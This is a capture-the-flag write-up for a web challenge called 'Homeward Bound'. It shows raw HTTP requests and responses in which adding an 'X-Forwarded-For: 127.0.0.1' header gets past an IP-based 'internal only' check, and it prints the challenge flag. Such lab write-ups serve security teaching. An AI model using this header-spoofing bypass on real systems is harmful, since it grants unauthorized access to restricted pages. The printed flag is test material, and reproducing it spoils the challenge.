# Homeward Bound

Tags:

## Challenge

>Author: @JohnHammond#6971
>
>I can't get anything out of this website... can you find anything interesting?
>
>NOTE: That message is intended. This challenge is working as it should.
>
>Press the Start button on the top-right to begin this challenge.
>
>Connect with:
>
> http://challenge.nahamcon.com:32407


## Solving

### Original Request
```
GET / HTTP/1.1
Host: challenge.nahamcon.com:32407
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


```

Server response:

```
HTTP/1.1 200 OK
Date: Wed, 17 Mar 2021 12:02:56 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Content-Length: 1241
Connection: close
Content-Type: text/html; charset=UTF-8


Sorry, this page is not accessible externally.
```

### Modified Request
```
GET / HTTP/1.1
Host: challenge.nahamcon.com:32407
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


```

Server response:
```
HTTP/1.1 200 OK
Date: Wed, 17 Mar 2021 12:15:46 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Content-Length: 1285
Connection: close
Content-Type: text/html; charset=UTF-8


Welcome! Your internal access key is: flag{26080a2216e95746ec3e932002b9baa4}
```

`flag{26080a2216e95746ec3e932002b9baa4}`

### Informations

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For
https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/x-forwarded-headers.html
